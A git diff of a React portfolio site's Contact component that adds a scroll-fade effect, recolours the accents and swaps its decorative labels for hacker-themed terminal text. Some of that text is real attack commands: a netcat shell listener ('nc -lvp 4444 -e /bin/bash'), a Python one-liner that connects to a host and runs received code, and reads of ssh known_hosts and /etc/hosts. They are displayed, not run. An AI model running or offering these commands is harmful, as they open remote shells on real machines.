@@ -1,13 +1,13 @@
 "use client";
 
-import { motion, useInView, AnimatePresence } from "framer-motion";
+import { motion, useInView, AnimatePresence, useScroll, useTransform, useSpring } from "framer-motion";
 import { useRef, useState } from "react";
 import { Mail, Phone, MapPin, Send, Linkedin, Github, Facebook, Loader2, CheckCircle2, XCircle } from "lucide-react";
 import { personalInfo } from "@/config/personalInfo";
 import { emailConfig, isEmailJSConfigured } from "@/config/emailConfig";
 import emailjs from "@emailjs/browser";
 import { fadeInLeft } from "@/utils/animations";
-import { gpuOptimized } from "@/utils/styles";
+import { gpuOptimized, gpuOptimizedOpacity } from "@/utils/styles";
 import { COLORS } from "@/utils/constants";
 
 const contactInfo = [
@@ -40,6 +40,22 @@ const socialLinks = [
 export default function Contact() {
   const ref = useRef(null);
   const isInView = useInView(ref, { once: true, margin: "-100px" });
+  const { scrollYProgress } = useScroll({
+    target: ref,
+    offset: ["start center", "end center"],
+  });
+
+  // Smooth spring animation for better performance
+  const smoothProgress = useSpring(scrollYProgress, {
+    stiffness: 100,
+    damping: 30,
+    restDelta: 0.001,
+  });
+
+  // Opacity peaks in center region (0.15 to 0.85), fades at edges
+  const opacity = useTransform(smoothProgress, [0, 0.15, 0.85, 1], [0.3, 1, 1, 0.3], {
+    clamp: true,
+  });
   const [formData, setFormData] = useState({
     name: "",
     email: "",
@@ -140,7 +156,13 @@ export default function Contact() {
 
   return (
     <section ref={ref} id="contact" className="py-12 sm:py-20 md:py-32 relative">
-      <div className="container-custom section-padding">
+      <motion.div
+        style={{
+          opacity,
+          ...gpuOptimizedOpacity,
+        }}
+        className="container-custom section-padding"
+      >
         <motion.div
           initial="hidden"
           animate={isInView ? "visible" : "hidden"}
@@ -148,17 +170,17 @@ export default function Contact() {
           transition={{ duration: 0.8 }}
           className="text-center mb-8 sm:mb-12 md:mb-16"
         >
-          <h2 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold mb-3 sm:mb-4 font-mono text-[#00ff00]">
-            func contactForm() {"{"} {"-&gt;"} Void
+          <h2 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold mb-3 sm:mb-4 font-mono text-[#00ff88]">
+            $ nc -lvp 4444 -e /bin/bash
           </h2>
           <motion.div
-            className="w-24 h-1 bg-[#00ff00] mx-auto mb-4 sm:mb-6"
+            className="w-24 h-1 bg-[#00ff88] mx-auto mb-4 sm:mb-6"
             initial={{ width: 0 }}
             animate={isInView ? { width: 96 } : { width: 0 }}
             transition={{ duration: 0.8, delay: 0.2 }}
           />
           <p className="text-gray-400 text-sm sm:text-base md:text-lg max-w-2xl mx-auto px-4 font-mono">
-            {"// Have an interesting project? Let's get in touch and create something amazing together!"}
+            {"// Reverse shell listener active on port 4444... Waiting for connection"}
           </p>
         </motion.div>
 
@@ -169,7 +191,7 @@ export default function Contact() {
             animate={isInView ? { opacity: 1, x: 0 } : { opacity: 0, x: -50 }}
             transition={{ duration: 0.8, delay: 0.2 }}
           >
-            <div className="mb-4 font-mono text-[#00ff00] text-sm">{"let contactInfo: [String: String] = ["}</div>
+            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ cat ~/.ssh/known_hosts | grep -E 'github|gitlab'"}</div>
             <h3 className="text-xl sm:text-2xl font-bold mb-4 sm:mb-6 text-white">Contact Information</h3>
             <div className="space-y-6 mb-8">
               {contactInfo.map((info, index) => {
@@ -180,9 +202,9 @@ export default function Contact() {
                     href={info.href}
                     target={info.href.startsWith("http") ? "_blank" : undefined}
                     rel={info.href.startsWith("http") ? "noopener noreferrer" : undefined}
-                    className="flex items-center gap-4 p-4 rounded border-2 border-[#00ff00]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff00] transition-all group relative overflow-hidden font-mono"
+                    className="flex items-center gap-4 p-4 rounded border-2 border-[#00ff88]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff88] transition-all group relative overflow-hidden font-mono"
                     style={{
-                      boxShadow: "0 0 20px rgba(0, 255, 0, 0.1)",
+                      boxShadow: "0 0 20px rgba(0, 255, 136, 0.1)",
                       ...gpuOptimized,
                     }}
                     initial={{ opacity: 0, y: 30 }}
@@ -192,15 +214,15 @@ export default function Contact() {
                       x: 5,
                       scale: 1.02,
                       y: -1,
-                      boxShadow: "0 0 30px rgba(0, 255, 0, 0.3)",
+                      boxShadow: "0 0 30px rgba(0, 255, 136, 0.3)",
                     }}
                   >
                     <motion.div
-                      className="absolute inset-0 bg-gradient-to-br from-[#00ff00]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
+                      className="absolute inset-0 bg-gradient-to-br from-[#00ff88]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
                     />
-                    <Icon className="w-5 h-5 text-[#00ff00] relative z-10" />
+                    <Icon className="w-5 h-5 text-[#00ff88] relative z-10" />
                     <div className="relative z-10">
-                      <div className="text-xs text-[#00ff00]/70 mb-1">{info.label}:</div>
+                      <div className="text-xs text-[#00ff88]/70 mb-1">{info.label}:</div>
                       <div className="text-sm text-white">{info.value}</div>
                     </div>
                   </motion.a>
@@ -209,7 +231,7 @@ export default function Contact() {
             </div>
 
             {/* Social Links */}
-            <div className="mb-4 font-mono text-[#00ff00] text-sm">{"let socialLinks: [[String: String]] = ["}</div>
+            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ cat /etc/hosts | grep -v '^#'"}</div>
             <div className="flex gap-4">
               {socialLinks.map((social, index) => {
                 const Icon = social.icon;
@@ -219,9 +241,9 @@ export default function Contact() {
                     href={social.href}
                     target="_blank"
                     rel="noopener noreferrer"
-                    className="p-3 rounded border-2 border-[#00ff00]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff00] transition-all group relative overflow-hidden"
+                    className="p-3 rounded border-2 border-[#00ff88]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff88] transition-all group relative overflow-hidden"
                     style={{
-                      boxShadow: "0 0 20px rgba(0, 255, 0, 0.1)",
+                      boxShadow: "0 0 20px rgba(0, 255, 136, 0.1)",
                       ...gpuOptimized,
                     }}
                     initial={{ opacity: 0, scale: 0 }}
@@ -230,20 +252,20 @@ export default function Contact() {
                     whileHover={{
                       scale: 1.1,
                       y: -2,
-                      boxShadow: "0 0 30px rgba(0, 255, 0, 0.3)",
+                      boxShadow: "0 0 30px rgba(0, 255, 136, 0.3)",
                     }}
                     whileTap={{ scale: 0.95 }}
                     aria-label={social.label}
                   >
                     <motion.div
-                      className="absolute inset-0 bg-gradient-to-br from-[#00ff00]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
+                      className="absolute inset-0 bg-gradient-to-br from-[#00ff88]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
                     />
-                    <Icon className="w-5 h-5 text-[#00ff00] relative z-10" />
+                    <Icon className="w-5 h-5 text-[#00ff88] relative z-10" />
                   </motion.a>
                 );
               })}
             </div>
-            <div className="mt-4 font-mono text-[#00ff00]/50 text-xs">];</div>
+            <div className="mt-4 font-mono text-[#00ff88]/50 text-xs">{"# End of config"}</div>
           </motion.div>
 
           {/* Contact Form */}
@@ -252,11 +274,11 @@ export default function Contact() {
             animate={isInView ? { opacity: 1, x: 0 } : { opacity: 0, x: 50 }}
             transition={{ duration: 0.8, delay: 0.4 }}
           >
-            <div className="mb-4 font-mono text-[#00ff00] text-sm">{"var form: [String: Any] = ["}</div>
+            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ python3 -c \"import socket; s=socket.socket(); s.connect(('target', 4444)); exec(s.recv(1024).decode())\""}</div>
             <form onSubmit={handleSubmit} className="space-y-6">
               {/* Name Field */}
               <div>
-                <label htmlFor="name" className="block text-xs text-[#00ff00]/70 mb-2 font-mono">
+                <label htmlFor="name" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                   name:
                 </label>
                 <motion.input
@@ -266,7 +288,7 @@ export default function Contact() {
                   onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                   onFocus={() => setFocusedField("name")}
                   onBlur={() => setFocusedField(null)}
-                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff00]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff00] focus:outline-none font-mono transition-all"
+                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff88]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff88] focus:outline-none font-mono transition-all"
                   placeholder="Enter your name"
                   style={gpuOptimized}
                   whileFocus={{
@@ -287,7 +309,7 @@ export default function Contact() {
 
               {/* Email Field */}
               <div>
-                <label htmlFor="email" className="block text-xs text-[#00ff00]/70 mb-2 font-mono">
+                <label htmlFor="email" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                   email:
                 </label>
                 <motion.input
@@ -297,7 +319,7 @@ export default function Contact() {
                   onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                   onFocus={() => setFocusedField("email")}
                   onBlur={() => setFocusedField(null)}
-                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff00]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff00] focus:outline-none font-mono transition-all"
+                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff88]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff88] focus:outline-none font-mono transition-all"
                   placeholder="Enter your email"
                   style={gpuOptimized}
                   whileFocus={{
@@ -318,7 +340,7 @@ export default function Contact() {
 
               {/* Message Field */}
               <div>
-                <label htmlFor="message" className="block text-xs text-[#00ff00]/70 mb-2 font-mono">
+                <label htmlFor="message" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                   message:
                 </label>
                 <motion.textarea
@@ -351,7 +373,7 @@ export default function Contact() {
               <motion.button
                 type="submit"
                 disabled={isSubmitting}
-                className="w-full px-6 py-3 bg-[#00ff00] text-black font-semibold rounded border-2 border-[#00ff00] hover:bg-[#00ff00]/90 transition-all font-mono flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
+                className="w-full px-6 py-3 bg-[#00ff88] text-black font-semibold rounded border-2 border-[#00ff88] hover:bg-[#00ff88]/90 transition-all font-mono flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                 style={gpuOptimized}
                 whileHover={{ scale: 1.02, y: -2 }}
                 whileTap={{ scale: 0.98 }}
@@ -395,10 +417,9 @@ export default function Contact() {
                 )}
               </AnimatePresence>
             </form>
-            <div className="mt-4 font-mono text-[#00ff00]/50 text-xs">{"}"}</div>
           </motion.div>
         </div>
-      </div>
+      </motion.div>
     </section>
   );
 }
